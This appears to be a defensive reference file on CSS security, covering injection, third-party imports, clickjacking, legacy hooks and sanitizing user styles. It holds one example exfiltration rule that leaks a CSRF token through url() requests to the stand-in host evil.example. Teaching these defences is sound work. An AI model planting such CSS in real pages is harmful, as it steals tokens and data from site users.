# Security

Use this ref when CSS crosses a trust boundary: user-generated styles, third-party stylesheets, values interpolated from input, or CSS that could leak application structure. This is the CSS-specific layer; the full treatment is in the security shelf (`securing-cascading-style-sheets`, `client-side-web-security`).

## CSS injection & data exfiltration

CSS is not "just presentation" — a crafted stylesheet can steal data.

- **Attribute-selector + `url()` exfiltration.** An attacker who can inject CSS can read attribute values (e.g. a CSRF token in a hidden input) character-by-character and leak them via background-image requests:

```css
input[name="csrf"][value^="a"] { background: url(https://evil.example/leak?c=a); }
```

  Defence: **never** put secrets in DOM attributes selectable by CSS; treat any injected/user-authored CSS as hostile; ship a `style-src` **Content-Security-Policy** that blocks inline styles and untrusted origins.

- **Never interpolate untrusted input** into `url()`, `content`, custom-property values, or an injected `<style>`. If a value must come from user input (e.g. a theme colour), **validate against an allowlist** (a parsed colour, a number range) before it reaches CSS — do not string-concatenate it in.

- **`content` can insert text** — attacker-controlled `content` values can spoof UI text. Sanitize.

## Third-party & imported CSS

- Third-party CSS runs with full power over your page (it can hide/overlay/re-skin anything). Vet it, pin versions, and isolate it in a low-priority `@layer` (→ `refs/architecture.md`).
- **`@import` from untrusted origins** pulls in remote CSS at runtime — a supply-chain and exfiltration vector. Prefer self-hosted, integrity-checked assets; constrain with CSP `style-src`.
- Font/image `url()`s in third-party CSS make network requests — a privacy/leak surface. Review them.

## Clickjacking & overlay attacks

- CSS can render an invisible or mispositioned overlay (`opacity: 0`, `position: fixed`, huge `z-index`) over a legitimate control to hijack clicks. This is primarily defended at the header level (`X-Frame-Options` / CSP `frame-ancestors`), but review any `position: fixed` / high-`z-index` / low-`opacity` interactive overlay for legitimacy.
- Don't let user-authored styles set `position`, `z-index`, `opacity`, `pointer-events`, or `transform` on containers they don't own.

## Legacy & footguns

- **`expression()`** (legacy IE) and other obsolete code-from-CSS hooks (`-moz-binding`, `behavior:`) executed JavaScript from a style value. All are dead in modern browsers — the live rule is the general one: never resurrect any mechanism that evaluates code from CSS.
- `pointer-events: none` for "disabling" is a visual trick, **not** a security control — the element is still in the DOM and interactive via keyboard/AT/JS. Enforce disabled state on the server and in markup (`disabled`/`aria-disabled`), not in CSS.

## Not disclosing structure via selectors

Descriptive, feature-named selectors leak your app's capabilities to anyone reading the CSS (`.deleteAllUsers`, `.exportUserData`, `.adminPanel`).

- Prefer **structural or hashed** class names (CSS Modules `localIdentName`, build-time obfuscation) over feature-revealing names.
- Don't ship a single global stylesheet containing selectors for **every** role — segment by role and enforce server-side access control before serving role-scoped CSS. Full guidance → security shelf `securing-cascading-style-sheets`.

## Sanitizing user-generated styles

If users can submit HTML/CSS (rich text, themes, email templates):

- Run it through a **CSS sanitizer** (allowlist of properties/values), not a denylist.
- Strip or neutralize `url()`, `@import`, `expression()`, `position`, `behavior`, and external references.
- Serve user content from a **separate origin** and constrain it with CSP so a break-out can't reach your app.

## Anti-Patterns

- Secrets in DOM attributes that CSS can select on.
- Untrusted input string-concatenated into `url()`, `content`, or a `<style>` block.
- Remote `@import` / third-party CSS loaded unvetted, unpinned, unlayered.
- No CSP `style-src` while accepting or embedding third-party/user styles.
- `pointer-events: none` treated as an authorization/disable mechanism.
- Feature-revealing selector names (`.deleteUser`) shipped in a public global stylesheet.
- User-generated styles allowed to set `position`/`z-index`/`opacity`/`transform` on shared containers.
